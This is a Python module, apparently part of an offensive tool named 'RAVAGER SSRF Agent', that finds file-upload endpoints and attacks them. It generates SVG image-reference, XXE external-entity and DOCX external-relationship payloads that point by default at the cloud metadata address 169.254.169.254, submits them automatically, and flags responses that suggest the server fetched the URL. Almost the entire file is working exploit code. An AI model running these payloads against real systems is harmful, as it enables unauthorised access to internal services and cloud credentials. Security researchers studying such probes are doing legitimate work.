"""
RAVAGER SSRF Agent — File Upload SSRF Probe
===============================================
Implements detection of SSRF vulnerabilities triggered through uploaded file
content rather than URL parameters.  Covers three file-format attack classes:

  SVG   — <image href="..."/> and <use xlink:href="..."/> parsed by ImageMagick,
           librsvg, Inkscape, or any server-side SVG renderer.

  DOCX  — External relationship in word/_rels/document.xml.rels parsed by
           LibreOffice, python-docx, Apache POI, or OOXML processors.

  XML   — Classic XXE with <!ENTITY xxe SYSTEM "..."> parsed by lxml, expat,
           or any SAX/DOM parser that leaves external-entity resolution enabled.

Detection strategy (no OOB required)
--------------------------------------
Since we may not have an OOB server, detection uses in-band heuristics:

  1. HTTP 500 / 502 / 503 — server tried to fetch and errored.
  2. Response body contains the SSRF URL domain or path fragments.
  3. Response body contains cloud-metadata keywords (ami-id, instance-id, etc.).
  4. Response time > 2× candidate baseline — suggests a fetch-then-timeout.
  5. If oob_domain provided, the SSRF URL embeds it (requires OOB confirmation).
"""

from __future__ import annotations

import asyncio
import io
import logging
import time
import zipfile
from typing import Any

from core.models import Candidate, VulnType, ParamLocation

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Parameter name heuristics — names that suggest a file-upload field
# ---------------------------------------------------------------------------
_UPLOAD_PARAM_WORDS: frozenset[str] = frozenset({
    "file", "attachment", "upload", "document", "doc", "docx",
    "svg", "xml", "resume", "cv", "certificate", "template",
    "spreadsheet", "xlsx", "xls", "pptx", "ppt", "odt",
    "logo", "avatar", "photo", "picture", "image", "media",
    "import", "ingest", "asset", "binary", "data",
})

# Path segments that strongly suggest an upload endpoint
_UPLOAD_PATH_WORDS: frozenset[str] = frozenset({
    "upload", "uploads", "attach", "attachment", "attachments",
    "document", "documents", "files", "file", "resume",
    "import", "ingest", "asset", "assets",
})

# Keywords in a response body that indicate the server reached the SSRF target
_METADATA_KEYWORDS: frozenset[str] = frozenset({
    "ami-id", "instance-id", "instance-type", "local-hostname",
    "local-ipv4", "computeMetadata", "serviceAccountEmail",
    "iam", "IAM", "ec2", "EC2", "metadata", "169.254",
    "TaskARN", "ECS_CONTAINER", "oracle-cloud", "opc-instance",
})


# ===========================================================================
# Payload generators
# ===========================================================================

def _svg_payload(ssrf_url: str) -> bytes:
    """Return SVG bytes with two SSRF trigger vectors."""
    svg = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"\n'
        '  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        '<svg xmlns="http://www.w3.org/2000/svg"\n'
        '     xmlns:xlink="http://www.w3.org/1999/xlink"\n'
        '     width="100" height="100">\n'
        f'  <image href="{ssrf_url}" width="100" height="100"/>\n'
        f'  <use xlink:href="{ssrf_url}"/>\n'
        f'  <feImage xmlns="http://www.w3.org/2000/svg" xlink:href="{ssrf_url}"/>\n'
        '</svg>\n'
    )
    return svg.encode()


def _xml_payload(ssrf_url: str) -> bytes:
    """Return XML bytes with an XXE external-entity SSRF vector."""
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE ssrf [<!ENTITY probe SYSTEM "{ssrf_url}">]>\n'
        '<ssrf>&probe;</ssrf>\n'
    )
    return xml.encode()


def _docx_payload(ssrf_url: str) -> bytes:
    """
    Return a minimal DOCX (ZIP) with an external relationship pointing to
    ssrf_url in word/_rels/document.xml.rels.  Any OOXML processor that
    resolves External relationships will trigger the SSRF.
    """
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
        '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
        '  <Default Extension="xml"  ContentType="application/xml"/>\n'
        '  <Override PartName="/word/document.xml"\n'
        '    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
        '</Types>\n'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        '  <Relationship Id="rId1"\n'
        '    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"\n'
        '    Target="word/document.xml"/>\n'
        '</Relationships>\n'
    )
    doc_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        f'  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"\n'
        f'    Target="{ssrf_url}" TargetMode="External"/>\n'
        '</Relationships>\n'
    )
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"\n'
        '            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">\n'
        '  <w:body><w:p><w:r><w:t>Test</w:t></w:r></w:p></w:body>\n'
        '</w:document>\n'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml",         content_types)
        zf.writestr("_rels/.rels",                  rels)
        zf.writestr("word/document.xml",            document)
        zf.writestr("word/_rels/document.xml.rels", doc_rels)
    return buf.getvalue()


# ---------------------------------------------------------------------------
# Payload registry  {file_type: (bytes_generator, filename, mime_type)}
# ---------------------------------------------------------------------------
_PAYLOADS: dict[str, tuple] = {
    "svg":  (_svg_payload,  "probe.svg",  "image/svg+xml"),
    "xml":  (_xml_payload,  "probe.xml",  "application/xml"),
    "docx": (_docx_payload, "probe.docx",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
}


# ===========================================================================
# Candidate filter
# ===========================================================================

def _is_upload_candidate(cand: Candidate) -> bool:
    """Return True if this candidate looks like a file-upload endpoint/param."""
    # VulnType already classified?
    if getattr(cand, "vuln_type", None) in (VulnType.FILE_UPLOAD_SSRF, VulnType.FILE_IMPORT):
        return True
    # Multipart param location is the clearest structural signal
    if getattr(cand, "param_location", None) == ParamLocation.BODY_MULTIPART:
        return True
    # Parameter name contains an upload-suggesting word
    param_lower = (cand.parameter or "").lower()
    for word in _UPLOAD_PARAM_WORDS:
        if word in param_lower:
            return True
    # Endpoint path contains an upload-suggesting segment
    try:
        from urllib.parse import urlparse
        path_parts = [p.lower() for p in urlparse(cand.target_url).path.split("/") if p]
    except Exception:
        path_parts = []
    for part in path_parts:
        for word in _UPLOAD_PATH_WORDS:
            if part.startswith(word):
                return True
    return False


# ===========================================================================
# Signal detection
# ===========================================================================

def _detect_anomaly(
    response_status: int,
    response_body: str,
    response_time: float,
    baseline_time: float,
    ssrf_url: str,
) -> str | None:
    """
    Return a human-readable anomaly description if the response suggests the
    server attempted to fetch ssrf_url, or None if the response looks clean.
    """
    # 1. Server-side fetch error codes
    if response_status in (500, 502, 503, 504):
        return f"HTTP {response_status} — server may have errored while fetching uploaded file content"

    # 2. SSRF URL echoed in response
    try:
        from urllib.parse import urlparse
        ssrf_host = urlparse(ssrf_url).netloc or ssrf_url
    except Exception:
        ssrf_host = ssrf_url
    if ssrf_host and ssrf_host in response_body:
        return f"Response body contains SSRF target host {ssrf_host!r}"

    # 3. Cloud metadata keywords in response
    for kw in _METADATA_KEYWORDS:
        if kw in response_body:
            return f"Response body contains cloud-metadata keyword {kw!r}"

    # 4. Response time >2× baseline (fetch-then-timeout heuristic)
    if baseline_time and response_time > baseline_time * 2.5 and response_time > 3.0:
        return (
            f"Response time {response_time:.1f}s is {response_time/baseline_time:.1f}× "
            f"baseline {baseline_time:.1f}s — possible fetch-then-timeout"
        )

    return None


# ===========================================================================
# Main probe function
# ===========================================================================

async def probe_upload_endpoints(
    candidates: list[Candidate],
    client: Any,
    ssrf_url: str = "http://169.254.169.254/latest/meta-data/",
    oob_domain: str | None = None,
) -> list[dict]:
    """
    Probe upload endpoints in the candidate list by submitting malicious
    SVG / DOCX / XML files and detecting in-band SSRF signals.

    Parameters
    ----------
    candidates  : list of Candidate objects from Phase 0 recon
    client      : the RAVAGER HttpClient instance
    ssrf_url    : SSRF target URL embedded in the file payloads
    oob_domain  : if set, embed in payload instead of ssrf_url; hits require
                  OOB confirmation (annotated in the returned dict)

    Returns
    -------
    list of dicts:
        endpoint   : str
        parameter  : str
        file_type  : str  (svg | docx | xml)
        anomaly    : str  (human-readable signal description)
        oob_required : bool
    """
    effective_url = f"http://{oob_domain}/ssrf-probe" if oob_domain else ssrf_url
    upload_candidates = [c for c in candidates if _is_upload_candidate(c)]

    if not upload_candidates:
        logger.debug("[file_upload_probe] no upload-candidate endpoints found")
        return []

    logger.info("[file_upload_probe] probing %d upload candidate(s)", len(upload_candidates))
    hits: list[dict] = []

    for cand in upload_candidates:
        baseline_time: float = 0.0
        if cand.baseline and hasattr(cand.baseline, "latency_ms"):
            baseline_time = cand.baseline.latency_ms / 1000.0

        for file_type, (gen_fn, filename, mime) in _PAYLOADS.items():
            payload_bytes = gen_fn(effective_url)
            param_name = cand.parameter or "file"

            try:
                t0 = time.monotonic()
                resp = await client.raw_multipart(
                    url=cand.target_url,
                    field_name=param_name,
                    file_bytes=payload_bytes,
                    filename=filename,
                    mime_type=mime,
                )
                elapsed = time.monotonic() - t0

                body = ""
                if resp is not None:
                    if hasattr(resp, "text"):
                        body = resp.text or ""
                    elif hasattr(resp, "body_snippet"):
                        body = resp.body_snippet or ""
                    status = getattr(resp, "status_code", 200)
                else:
                    status = 0

                anomaly = _detect_anomaly(
                    response_status=status,
                    response_body=body,
                    response_time=elapsed,
                    baseline_time=baseline_time,
                    ssrf_url=effective_url,
                )
                if anomaly:
                    hit: dict = {
                        "endpoint":     cand.target_url,
                        "parameter":    param_name,
                        "file_type":    file_type,
                        "anomaly":      anomaly,
                        "oob_required": oob_domain is not None,
                    }
                    hits.append(hit)
                    logger.info(
                        "[file_upload_probe] HIT %s param=%s type=%s: %s",
                        cand.target_url, param_name, file_type, anomaly,
                    )
                    # One hit per endpoint is enough — don't over-probe
                    break

            except Exception as exc:
                logger.debug(
                    "[file_upload_probe] %s param=%s type=%s: %s",
                    cand.target_url, param_name, file_type, exc,
                )
                continue

    return hits
